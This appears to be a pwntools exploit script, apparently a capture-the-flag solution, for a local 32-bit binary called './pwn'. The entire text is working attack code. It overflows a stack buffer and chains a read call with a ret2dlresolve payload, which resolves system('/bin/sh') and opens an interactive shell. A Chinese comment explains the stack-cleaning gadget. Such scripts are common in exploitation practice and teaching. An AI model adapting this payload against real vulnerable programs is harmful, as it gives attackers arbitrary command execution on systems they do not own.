from pwn import *

context.log_level = 'debug'

p = process('./pwn')
elf = ELF('./pwn')

offset = 0x10c
start_resolve = 0x8049020
pop_3_ret = 0x804901b # 清理栈上的值（3个），这3个被pop的值是read函数的参数，我们需要ret到后面的start_resolve

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh\x00'])

payload = b'a' * offset + p32(elf.plt['read']) + p32(pop_3_ret) + p32(0) + p32(dlresolve.data_addr) + p32(0x100)
payload += p32(start_resolve) + p32(dlresolve.reloc_index) + p32(0xdeadbeaf) + p32(dlresolve.real_args[0])
p.send(payload)
p.send(dlresolve.payload)

p.interactive()